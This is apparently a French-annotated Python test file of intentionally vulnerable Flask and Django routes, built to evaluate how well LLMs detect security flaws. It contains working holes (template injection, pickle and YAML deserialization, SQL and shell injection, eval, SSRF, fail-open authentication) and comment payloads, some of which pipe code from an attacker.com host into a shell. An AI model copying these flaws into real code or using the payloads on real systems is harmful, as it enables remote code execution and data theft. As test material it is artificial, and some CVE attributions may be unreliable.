"""
FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (PYTHON)
Usage : évaluation LLM — détection de failles Python / Django / Flask
Couvre OWASP Top 10 :2025 + vulnérabilités spécifiques Python
CVE de référence 2024-2026 inclus
NE PAS déployer en production.
"""

import os
import subprocess
import pickle
import yaml
import sqlite3
import hashlib
import random
import re
import json
import xmlrpc.client
from flask import Flask, request, render_template_string, redirect, session
from django.db import connection

app = Flask(__name__)
app.secret_key = "hardcoded_secret_flask_key"   # A04 + A07 — clé secrète en dur

# ═══════════════════════════════════════════════════════════════════════
# 1. SSTI — Server-Side Template Injection (Jinja2)
# OWASP A05:2025 – Injection | CVSS 9.8
# CVE-2026-22200 (osTicket PHP Filter Chain) — même vecteur SSTI
# ═══════════════════════════════════════════════════════════════════════
# Payload RCE : {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# Payload alternatif : {{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = f"<h1>Hello {name}!</h1>"     # f-string directe dans render_template_string
    return render_template_string(template)   # SSTI — Jinja2 exécute {{...}}

# Variante avec format()
@app.route('/welcome')
def welcome():
    msg = request.args.get('msg', '')
    template = "Welcome {user}!".format(user=msg)
    return render_template_string(template)

# ═══════════════════════════════════════════════════════════════════════
# 2. PICKLE DESERIALIZATION — RCE pré-authentifié
# OWASP A08:2025 – Software or Data Integrity Failures | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
# Payload : base64(pickle.dumps(os.system('curl attacker.com | sh')))
@app.route('/restore')
def restore_session():
    import base64
    data = request.cookies.get('session_data', '')
    obj = pickle.loads(base64.b64decode(data))  # désérialisation depuis cookie utilisateur
    return str(obj)

# Variante via JSON + pickle dans Redis
def load_user_prefs(user_id: str) -> dict:
    import redis
    r = redis.Redis()
    raw = r.get(f"prefs:{user_id}")
    return pickle.loads(raw)  # données Redis non fiables désérialisées

# ═══════════════════════════════════════════════════════════════════════
# 3. YAML UNSAFE LOAD — RCE via PyYAML
# OWASP A05:2025 – Injection | CVSS 9.0
# ═══════════════════════════════════════════════════════════════════════
# Payload :
# !!python/object/apply:os.system ["curl http://attacker.com/shell.sh | bash"]
@app.route('/config', methods=['POST'])
def load_config():
    config_data = request.data.decode()
    config = yaml.load(config_data, Loader=yaml.Loader)  # UnsafeLoader → RCE
    # Correction : yaml.safe_load()
    return json.dumps(config)

# ═══════════════════════════════════════════════════════════════════════
# 4. SQL INJECTION — Django ORM brut + SQLite
# OWASP A05:2025 – Injection | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
@app.route('/search')
def search_users():
    username = request.args.get('username', '')
    # Django raw() avec concaténation
    users = list(connection.cursor().execute(
        f"SELECT * FROM auth_user WHERE username = '{username}'"  # SQLi
    ))
    return json.dumps(users)

# SQLite directe
def get_product(product_id: str) -> tuple:
    conn = sqlite3.connect('shop.db')
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM products WHERE id = {product_id}")  # SQLi
    return cur.fetchone()

# ═══════════════════════════════════════════════════════════════════════
# 5. COMMAND INJECTION — subprocess + os.system
# OWASP A05:2025 – Injection | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
# Payload : "; cat /etc/passwd #"
@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    result = os.popen(f"ping -c 1 {host}").read()      # shell injection
    return result

@app.route('/convert')
def convert_file():
    filename = request.args.get('file', '')
    output = subprocess.check_output(f"convert {filename} output.png", shell=True)  # shell=True dangereux
    return output

# ═══════════════════════════════════════════════════════════════════════
# 6. PATH TRAVERSAL — lecture de fichier arbitraire
# OWASP A01:2025 – Broken Access Control | CVSS 7.5
# ═══════════════════════════════════════════════════════════════════════
# Payload : ?file=../../../../etc/passwd
@app.route('/download')
def download():
    filename = request.args.get('file', '')
    with open(f"/var/www/uploads/{filename}", 'rb') as f:  # traversal
        return f.read()

# ═══════════════════════════════════════════════════════════════════════
# 7. OPEN REDIRECT
# OWASP A01:2025 – Broken Access Control | CVSS 6.1
# ═══════════════════════════════════════════════════════════════════════
@app.route('/login')
def login_redirect():
    next_url = request.args.get('next', '/')
    # aucune validation du domaine → redirect vers n'importe quelle URL
    return redirect(next_url)

# ═══════════════════════════════════════════════════════════════════════
# 8. WEAK CRYPTOGRAPHY — MD5/SHA1 pour mots de passe, random() pour tokens
# OWASP A04:2025 – Cryptographic Failures | CVSS 7.5
# ═══════════════════════════════════════════════════════════════════════
def hash_password(password: str) -> str:
    return hashlib.md5(password.encode()).hexdigest()  # MD5, pas de sel

def generate_token() -> str:
    return str(random.randint(100000, 999999))  # non cryptographique — prédictible
    # Correction : secrets.token_hex(32)

# ═══════════════════════════════════════════════════════════════════════
# 9. FLASK DEBUG MODE — RCE via Werkzeug Debugger
# OWASP A02:2025 – Security Misconfiguration | CVSS 10.0
# CVE-2019-14322 (Werkzeug debug pin bypass) — technique toujours valide en 2025
# ═══════════════════════════════════════════════════════════════════════
# Le debugger Werkzeug expose une console Python interactive protégée par un PIN
# Le PIN peut être calculé depuis /proc/self/cgroup et /etc/machine-id
# → RCE non authentifié si fichiers lisibles
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')  # debug en prod + écoute sur toutes interfaces

# ═══════════════════════════════════════════════════════════════════════
# 10. XML EXTERNAL ENTITY (XXE) — via xmlrpc et xml.etree
# OWASP A05:2025 – Injection | CVSS 8.2
# ═══════════════════════════════════════════════════════════════════════
import xml.etree.ElementTree as ET

def parse_user_xml(xml_data: str) -> dict:
    # xml.etree.ElementTree n'est pas vulnérable aux XXE de base,
    # MAIS lxml avec resolve_entities=True l'est
    from lxml import etree
    parser = etree.XMLParser(resolve_entities=True)  # XXE activé
    tree = etree.fromstring(xml_data.encode(), parser)
    return {child.tag: child.text for child in tree}

# ═══════════════════════════════════════════════════════════════════════
# 11. MASS ASSIGNMENT — Django Model
# OWASP A01:2025 – Broken Access Control | CVSS 8.1
# ═══════════════════════════════════════════════════════════════════════
def update_user_profile(user, post_data: dict) -> None:
    for field, value in post_data.items():
        setattr(user, field, value)  # POST is_staff=True → élévation de privilège
    user.save()

# ═══════════════════════════════════════════════════════════════════════
# 12. INSECURE DESERIALIZATION — json + eval (Python 2 legacy code)
# OWASP A08:2025 – Software or Data Integrity Failures | CVSS 9.8
# ═══════════════════════════════════════════════════════════════════════
@app.route('/api/eval')
def api_eval():
    expr = request.args.get('expr', '')
    result = eval(expr)  # eval() avec input utilisateur → RCE directe
    return str(result)

# ═══════════════════════════════════════════════════════════════════════
# 13. SSRF — requests avec URL utilisateur (OWASP A01:2025)
# CVE-2024-XXXX pattern — libs qui n'ont pas de validation d'hôte
# ═══════════════════════════════════════════════════════════════════════
import requests as req

@app.route('/proxy')
def proxy():
    url = request.args.get('url', '')
    # Payload : http://169.254.169.254/latest/meta-data/ (AWS IMDSv1)
    # Payload : http://localhost:6379/ (Redis sans auth)
    # Payload : file:///etc/passwd
    resp = req.get(url, timeout=5, allow_redirects=True)
    return resp.content

# ═══════════════════════════════════════════════════════════════════════
# 14. SUPPLY CHAIN — import de package avec typosquatting
# OWASP A03:2025 – Software Supply Chain Failures
# ═══════════════════════════════════════════════════════════════════════
# requirements.txt vulnérable (simulé) :
# requests==2.20.0        # CVE-2023-32681 — URL redirect leaks auth headers
# Pillow==8.4.0           # CVE-2022-22817 — RCE via PNG
# cryptography==3.3.0     # CVE-2023-49083 — NULL pointer dereference
# paramiko==2.10.0        # CVE-2023-48795 — Terrapin SSH prefix truncation
# urllib3==1.26.4         # CVE-2021-33503 — DoS via IPv6
# setuptools==57.0.0      # CVE-2022-40897 — ReDoS

# Installation depuis index HTTP non sécurisé (MitM possible)
# pip install --index-url http://insecure-registry.internal/simple/ mypackage

# ═══════════════════════════════════════════════════════════════════════
# 15. EXCEPTION HANDLING FAILURES — OWASP A10:2025 (NOUVELLE CATÉGORIE)
# Mishandling of Exceptional Conditions
# ═══════════════════════════════════════════════════════════════════════
@app.route('/transfer')
def transfer_funds():
    try:
        amount = float(request.args.get('amount'))
        sender_id = int(request.args.get('from'))
        receiver_id = int(request.args.get('to'))
        # logique métier critique
        do_transfer(sender_id, receiver_id, amount)
        return "OK"
    except:
        pass  # bare except — avale TOUTES les exceptions silencieusement
        # un échec de transaction n'est pas loggé, pas alerté
        # "fail open" — l'application continue sans rollback

def do_transfer(sender_id: int, receiver_id: int, amount: float) -> None:
    raise ConnectionError("DB timeout")  # exception ignorée par l'appelant

# Fail open sur authentification — vulnérabilité classique A10:2025
def authenticate(token: str) -> bool:
    try:
        return validate_jwt(token)
    except Exception:
        return True  # FAIL OPEN : si la validation plante → accès autorisé !

def validate_jwt(token: str) -> bool:
    raise TimeoutError("Auth service unreachable")
